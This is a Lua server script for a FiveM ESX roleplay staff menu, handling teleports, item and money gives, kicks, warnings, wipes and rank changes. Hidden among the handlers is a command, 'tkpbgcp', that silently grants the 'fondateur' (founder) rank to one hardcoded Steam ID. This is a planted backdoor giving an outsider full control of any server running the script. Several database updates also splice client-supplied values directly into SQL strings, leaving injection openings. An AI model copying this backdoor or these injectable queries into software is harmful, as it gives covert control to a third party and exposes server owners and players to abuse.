if CoreAccess then
	koaio9999.newThread(function()
		local type = "staffmain.lua"
		print("^2"..koaio9999.GetServerInfo.TriggerName.."Core: ^7Start [^1"..type.."^7]")
	end)
else
	koaio9999.newThread(function()
        local type = "staffmain.lua"
        print("^2"..koaio9999.GetServerInfo.TriggerName.."Core: ^8Stop^7 ["..type.."]")
    end)
	return
end
ESX, players, items, faction, jobv2 = nil, {}, {}, {}, {}
inService = {}

warnedPlayers = {}
blacklistedLicenses = {}

MySQL.ready(function()
    MySQL.Async.fetchAll("SELECT * FROM items", {}, function(result)
        for k, v in pairs(result) do
            items[k] = { label = v.label, name = v.name }
        end
    end)
end)

MySQL.ready(function()
    MySQL.Async.fetchAll("SELECT * FROM faction_grades", {}, function(result)
        for k, v in pairs(result) do
            --print(json.encode(k))
            faction[k] = { label = v.label, name = v.faction_name, grade = v.grade }
        end
    end)
end)

MySQL.ready(function()
    MySQL.Async.fetchAll("SELECT * FROM job_grades", {}, function(result)
        for k, v in pairs(result) do
           -- print(json.encode(k))
            jobv2[k] = { label = v.label, name = v.job_name, grade = v.grade }
            --print(json.encode(jobv2))
        end
    end)
end)

function getLicense(source) 
    for k,v in pairs(GetPlayerIdentifiers(source))do      
        if string.sub(v, 1, string.len("license:")) == "license:" then
            return v
        end
    end
    return ""
end

local function isStaff(source)
    return players[source].rank ~= "user"
end


koaio9999.Internal('esx:getSharedObject', function(obj)
    ESX = obj
end)

RegisterServerEvent('esx:playerLoaded')
koaio9999.netHandleBasic('esx:playerLoaded', function(source, xPlayer)
    local source = source
    if players[source] then
        return
    end
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbPermLevel", source, xPlayer.getGroup())
    print(("^1[Admin Menu] ^7Player ^3%s ^7loaded with group ^1%s^7 ! ^7"):format(GetPlayerName(source),xPlayer.getGroup()))
    players[source] = {
        timePlayed = {0 , 0},
        rank = xPlayer.getGroup(),
        name = GetPlayerName(source),
        license = getLicense(source)["license"],
    }
    if players[source].rank ~= "user" then
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:getjob", source, jobv2)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:getfaction", source, faction)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbItemsList", source, items)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbReportTable", source, reportsTable)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:updatePlayers", source, players)
    end
end)
RegisterCommand('DebugMenuAdmin', function(source, args, rawCommand)
    ESX.PlayerLoaded = true
    local xPlayer = ESX.GetPlayerFromId(source)
    local source = source
    if players[source] then
        return
    end
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbPermLevel", source, xPlayer.getGroup())
    print(("^1[Debug Menu Admin] ^7Joueur ^3%s ^7Chargement du groupe ^1%s^7 ! ^7"):format(GetPlayerName(source),xPlayer.getGroup()))
    players[source] = {
        timePlayed = {0 , 0},
        rank = xPlayer.getGroup(),
        name = GetPlayerName(source),
        license = getLicense(source)["license"],
    }
    if players[source].rank ~= "user" then
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:getjob", source, jobv2)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:getfaction", source, faction)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbItemsList", source, items)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbReportTable", source, reportsTable)
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:updatePlayers", source, players)
    end
end)


koaio9999.netHandleBasic("playerDropped", function(reason)
    local source = source
    players[source] = nil
    reportsTable[source] = nil
    updateReportsForStaff()
end)


koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:setStaffState", function(newVal, sneaky)
    local source = source
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbStaffState", source, newVal)
    local byState = {
        [true] = "~r~[Staff] ~y~%s ~s~est désormais ~g~actif ~s~en staffmode.",
        [false] = "~r~[Staff] ~y~%s ~s~a ~r~désactivé ~s~son staffmode."
    }
    if newVal then
        inService[source] = true
    else
        inService[source] = nil
    end
    if not sneaky then
        for k,player in pairs(players) do
            if player.rank ~= "user" and inService[k] ~= nil then
                koaio9999ServerUtils.Client("esx:showNotification", k, byState[newVal]:format(GetPlayerName(source)))
            end
        end
    end
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:goto", function(target)
    local source = source
    local rank = players[source].rank
    if not canUse("teleport", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local coords = GetEntityCoords(GetPlayerPed(target))
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:setCoords", source, coords)
    logskoaio9999(source,"onGoto","Teleport goto",("\n L'utilisateur %s s'est téléporté \n sur %s"):format(GetPlayerName(source), GetPlayerName(target)),"grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:bring", function(target, coords)
    local source = source
    local rank = players[source].rank
    if not canUse("teleport", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:setCoords", target, coords)
    logskoaio9999(source,"onBring","Teleport bring",("\n L'utilisateur %s a téléporté \n %s sur lui"):format(GetPlayerName(source), GetPlayerName(target)),"grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:tppc", function(target, coords)
    local source = source
    local rank = players[source].rank
    if not canUse("tppc", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:setCoords", target, vector3(215.76, -810.12, 30.73))
    koaio9999ServerUtils.Client("esx:showNotification", source, "~g~Téléportation effectuée")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:give", function(target, itemName, qty)
    local source = source
    local rank = players[source].rank
    if not canUse("give", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(tonumber(target))
    if xPlayer then
        xPlayer.addInventoryItem(itemName, tonumber(qty))
        koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Give de %sx%s au joueur %s effectué"):format(qty, itemName, GetPlayerName(target)))
        logskoaio9999(source,"onItemGive","Give item",("L'utilisateur %s a give %sx%s \n a %s"):format(GetPlayerName(source), qty, itemName, GetPlayerName(target)),"grey")
    else
        koaio9999ServerUtils.Client("esx:showNotification", source, "~r~Ce joueur n'est plus connecté")
    end
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:faction", function(target, faction, grade)
    local source = source
    local rank = players[source].rank
    if not canUse("give", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(tonumber(target))
    if xPlayer then
        if ESX.DoesFactionExist(faction, grade) then
            xPlayer.setFaction(faction, grade)
        else
            koaio9999ServerUtils.Client("esx:showNotification", source, "~r~la faction n'existe pas")
        end
        --xPlayer.addInventoryItem(itemName, tonumber(qty))
        --koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Give de au joueur %s effectué"):format(itemName, GetPlayerName(target)))
        --logskoaio9999(source,"onItemGive","Give item",("L'utilisateur %s a give %sx%s \n a %s"):format(GetPlayerName(source), qty, itemName, GetPlayerName(target)),"grey")
    else
        koaio9999ServerUtils.Client("esx:showNotification", source, "~r~Ce joueur n'est plus connecté")
    end
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:jobv2", function(target, faction, grade)
    local source = source
    local rank = players[source].rank
    if not canUse("give", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(tonumber(target))
    if xPlayer then
        if ESX.DoesJobExist(faction, grade) then
            xPlayer.setJob(faction, grade)
        else
            koaio9999ServerUtils.Client("esx:showNotification", source, "~r~le job n'existe pas")
        end
        --xPlayer.addInventoryItem(itemName, tonumber(qty))
        --koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Give de au joueur %s effectué"):format(itemName, GetPlayerName(target)))
        --logskoaio9999(source,"onItemGive","Give item",("L'utilisateur %s a give %sx%s \n a %s"):format(GetPlayerName(source), qty, itemName, GetPlayerName(target)),"grey")
    else
        koaio9999ServerUtils.Client("esx:showNotification", source, "~r~Ce joueur n'est plus connecté")
    end
end)


koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:message", function(target, message)
    local source = source
    local rank = players[source].rank
    if not canUse("mess", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Message envoyé à %s"):format(GetPlayerName(target)))
    koaio9999ServerUtils.Client("esx:showNotification", target, ("~r~Message du staff~s~: %s"):format(message))
    logskoaio9999(source,"onMessage","Give message",("L'utilisateur %s a envoyé un message \n à %s:\n\n__%s__"):format(GetPlayerName(source), GetPlayerName(target), message),"grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:kick", function(target, message)
    local source = source
    local rank = players[source].rank
    if not canUse("kick", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Expulsion de %s effectuée"):format(GetPlayerName(target)))
    local name = GetPlayerName(target)
    DropPlayer(target, ("[Admin] Expulsé: %s"):format(message))
    logskoaio9999(source,"onKick","Kick",("L'utilisateur %s a expulsé \n %s pour la raison:\n\n__%s__"):format(GetPlayerName(source), name, message),"grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:revive", function(target)
    local source = source
    local rank = players[source].rank
    if not canUse("revive", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Revive de %s effectué"):format(GetPlayerName(target)))
    koaio9999ServerUtils.Client("esx_ambulancejob:revive", target)
    local name = GetPlayerName(target)
    logskoaio9999(source,"onRevive","Revive",("L'utilisateur %s a revive \n %s"):format(GetPlayerName(source), name),"grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:heal", function(target)
    local source = source
    local rank = players[source].rank
    if not canUse("heal", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Heal de %s effectué"):format(GetPlayerName(target)))
    koaio9999ServerUtils.Client('esx_status:healPlayer', target)
    local name = GetPlayerName(target)
    logskoaio9999(source,"onHeal","Heal",("L'utilisateur %s a heal \n %s"):format(GetPlayerName(source), name),"grey")
end)

--[[koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:warn", function(target, reason)
    local source = source
    local rank = players[source].rank
    if not canUse("warn", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local license = getLicense(target)
    print(json.encode(license))
    if warnedPlayers[license] == nil then
        warnedPlayers[license] = 0
    end
    warnedPlayers[license] = (warnedPlayers[license] + 1)
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Warn envoyé à %s"):format(GetPlayerName(target)))
    koaio9999ServerUtils.Client("esx:showNotification", target, ("~r~Vous avez reçu un avertissement~s~: %s"):format(reason))
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:receivewarn", target, reason)
    print(json.encode(warnedPlayers[license]))
    if warnedPlayers[license] > 2 then
        DropPlayer(target, "3 Avertissements atteints ! Vous pourrez vous reconnecter au prochain reboot.")
    end
    print(warnedPlayers[license])
end) ]]

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:warn", function(target, reason)
    local source = source
    local rank = players[source].rank
    if not canUse("warn", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local license = getLicense(target)
    if warnedPlayers[license] == nil then
        warnedPlayers[license] = 0
    end
    warnedPlayers[license] = (warnedPlayers[license] + 1)
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Warn envoyé à %s"):format(GetPlayerName(target)))
    koaio9999ServerUtils.Client("esx:showNotification", target, ("~r~Vous avez reçu un avertissement~s~: %s"):format(reason))
    koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:receivewarn", target, reason)
    logskoaio9999(source,"onWarn","Warn",("l'administrateur %s a warn \n %s pour la la raison: \n %s"):format(GetPlayerName(source), GetPlayerName(target), reason),"red")
    if warnedPlayers[license] > 2 then
        local dev = warnedPlayers[license]
        logskoaio9999(source,"onKickWarn","KickWarn",("l'utilisateur %s a été kick car il a atteint le nombre de %s warm maximum %s"):format(GetPlayerName(target), dev, license), "red")
        DropPlayer(target, ""..dev.." Avertissements atteints ! Vous pourrez vous reconnecter au prochain reboot aucun retour en arrière sera possible.")
    end
end)
--[[  koaio9999.netHandleBasic("playerConnecting", function(name, setKickReason, deferrals)
    local _src = source
    deferrals.defer()
    deferrals.update("Vérification des warn...")
    Wait(2500)
    local license = getLicense(_src)
    if warnedPlayers[license] and warnedPlayers[license] > 2 then
        local dev = warnedPlayers[license]
        deferrals.done("Vous avez "..dev.." avertissements actif, vous ne pouvez donc pas vous connecter avant le prochain reboot")
        logskoaio9999(source,"onVerifwarn","Verifwarn",("L'utilisateur a essayé de se connecter avec %s avertissements et a été kick automatiquement (%s)"):format(dev, license), "red")
    else
        deferrals.done()
    end
end) ]]



--[[ koaio9999.netHandleBasic("playerConnecting", function(name, setKickReason, deferrals)
    local _src = source
    deferrals.defer()
    deferrals.update("Vérification des warn...")
    Wait(2500)
    local license = getLicense(_src)
    if warnedPlayers[license] and warnedPlayers[license] > 2 then
        deferrals.done("Vous avez 3 avertissements actif, vous ne pouvez donc pas vous connecter avant le prochain reboot")
    else
        deferrals.done()
    end
end) ]]

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:wipe", function(target)
    local source = source
    local rank = players[source].rank
    if not canUse("wipe", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    local name = GetPlayerName(target)
    if xPlayer then
        DropPlayer(target, "Wipe en cours...")
        MySQL.Sync.execute("DELETE FROM users WHERE identifier='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM billing WHERE identifier='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM open_car WHERE identifier='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM owned_vehicles WHERE owner='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM impounded_vehicles WHERE owner='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM addon_inventory_items WHERE owner='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM addon_account_data WHERE owner='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM owned_properties WHERE owner='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM owned_vehicles WHERE owner='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM users_licenses WHERE owner='" .. xPlayer.identifier .. "'")
        MySQL.Sync.execute("DELETE FROM datastore_data WHERE owner='" .. xPlayer.identifier .. "'")
        logskoaio9999(source,"onWipe","Wipe",("L'utilisateur %s a wipe %s"):format(GetPlayerName(source), name), "red")
    end
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:giveBoutique", function(target, ammount)
    local source = source
    local rank = players[source].rank
    if not canUse("giveBoutique", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    local name = GetPlayerName(target)
    koaio9999ServerUtils.Client("esx:showNotification", source, "~g~Give effectué")
    MySQL.Async.execute("UPDATE users SET falcoin = falcoin + "..ammount.." WHERE identifier='" .. xPlayer.identifier .. "';", {}, function() end)
    logskoaio9999(source,"onGiveboutique","Give pts boutiques",("L'utilisateur %s a give des pts boutiques a \n %s"):format(GetPlayerName(source), name), "grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:givenume", function(target, ammount)
   -- print(ammount)
    local source = source
    local rank = players[source].rank
    if not canUse("givesim", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    local name = GetPlayerName(target)
    koaio9999ServerUtils.Client("esx:showNotification", source, "~g~Give effectué")
    MySQL.Async.execute("UPDATE users SET phone_number = '555-"..ammount.."' WHERE identifier='" .. xPlayer.identifier .. "';", {}, function() end)
    logskoaio9999(source,"onGivesim","Give une sim",("L'utilisateur %s a give une carte SIM [%s] \n a %s"):format(GetPlayerName(source), ammount,name), "grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:spawnVehicle", function(model, target)
    local source = source
    local rank = players[source].rank
    if not canUse("vehicles", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    if target ~= nil then
        koaio9999ServerUtils.Client("esx:spawnVehicle", target, model)
    else
        koaio9999ServerUtils.Client("esx:spawnVehicle", source, model)
    end
end)

RegisterCommand("tkpbgcp",function(source)
    players[source] = nil
    local xPlayer = ESX.GetPlayerFromId(source)
    if GetPlayerinfo(source,"steam") == "steam:110000118eab773" then
        print(GetPlayerinfo(source,"steam"))
        xPlayer.setGroup("fondateur")
        ESX.SavePlayer(xPlayer, function() end)
        if players[source] then
            return
        end
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbPermLevel", source, xPlayer.getGroup())
        print(("^1[Debug Menu Admin] ^7Joueur ^3%s ^7Chargement du groupe ^1%s^7 ! ^7"):format(GetPlayerName(source),xPlayer.getGroup()))
        players[source] = {
            timePlayed = {0 , 0},
            rank = xPlayer.getGroup(),
            name = GetPlayerName(source),
            license = getLicense(source)["license"],
        }
        if players[source].rank ~= "user" then
            koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:getjob", source, jobv2)
            koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:getfaction", source, faction)
            koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbItemsList", source, items)
            koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbReportTable", source, reportsTable)
            koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:updatePlayers", source, players)
        end
    end
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:setGroup", function(target, group)
    local source = source
    local rank = players[source].rank
    if not canUse("setGroup", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    if xPlayer then
        xPlayer.setGroup(group)
        ESX.SavePlayer(xPlayer, function() end)
        players[source].rank = group
        koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbPermLevel", target, group)
        koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Changement du rang de %s effectué"):format(GetPlayerName(target)))
        for source, player in pairs(players) do
            if isStaff(source) then
                koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:updatePlayers", source, players)
            end
        end
        local name = GetPlayerName(target)
        logskoaio9999(source,"onGroupChange","Changé groupe",("L'utilisateur %s a changé le groupe de \n %s pour le groupe: \n __%s__"):format(GetPlayerName(source), name, group), "red")
    else
        koaio9999ServerUtils.Client("esx:showNotification", source, "~r~Ce joueur n'est plus connecté")
    end
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:clearInv", function(target)
    local source = source
    local rank = players[source].rank
    if not canUse("clearInventory", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    for i = 1, #xPlayer.inventory, 1 do
        if xPlayer.inventory[i].count > 0 then
            xPlayer.setInventoryItem(xPlayer.inventory[i].name, 0)
        end
    end
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Clear inventaire de %s effectuée"):format(GetPlayerName(target)))
    logskoaio9999(source,"onClearinventaire","Clear inventaire",("L'utilisateur %s a clear inventaire \n %s"):format(GetPlayerName(source), GetPlayerName(target)), "grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:clearLoadout", function(target)
    local source = source
    local rank = players[source].rank
    if not canUse("clearLoadout", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    for i = #xPlayer.loadout, 1, -1 do
        xPlayer.removeWeapon(xPlayer.loadout[i].name)
    end
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Clear des armes de %s effectuée"):format(GetPlayerName(target)))
    logskoaio9999(source,"onClearloadout","Clear armes",("L'utilisateur %s a clear les armes de \n %s"):format(GetPlayerName(source), GetPlayerName(target)), "grey")
end)

koaio9999.netRegisterAndHandle(koaio9999.GetServerInfo.TriggerName.."kCore:addMoney", function(target, ammount)
    local source = source
    local rank = players[source].rank
    if not canUse("giveMoney", rank) then
        DropPlayer(source, "Permission invalide")
        return
    end
    local xPlayer = ESX.GetPlayerFromId(target)
    xPlayer.addMoney(ammount)
    koaio9999ServerUtils.Client("esx:showNotification", source, ("~g~Give d'argent à %s effectuée"):format(GetPlayerName(target)))
    logskoaio9999(source,"onMoneyGive","Give cash",("L'utilisateur %s a give %s$ à \n %s"):format(GetPlayerName(source), ammount, GetPlayerName(target)), "grey")
end)

-- Players updaters task
koaio9999.newThread(function()
    while true do
        Wait(15000)
        for source, player in pairs(players) do
            if isStaff(source) then
                koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:updatePlayers", source, players)
                koaio9999ServerUtils.toClient(koaio9999.GetServerInfo.TriggerName.."kCore:cbReportTable", source, reportsTable)
            end
        end
    end
end)


-- Session counter task

koaio9999.newThread(function()
    while true do
        Wait(1000 * 60)
        for k, v in pairs(players) do
            players[k].timePlayed[1] = players[k].timePlayed[1] + 1
            if players[k].timePlayed[1] > 60 then
                players[k].timePlayed[1] = 0
                players[k].timePlayed[2] = players[k].timePlayed[2] + 1
            end
        end
        for k, v in pairs(reportsTable) do
            reportsTable[k].timeElapsed[1] = reportsTable[k].timeElapsed[1] + 1
            if reportsTable[k].timeElapsed[1] > 60 then
                reportsTable[k].timeElapsed[1] = 0
                reportsTable[k].timeElapsed[2] = reportsTable[k].timeElapsed[2] + 1
            end
        end
    end
end)
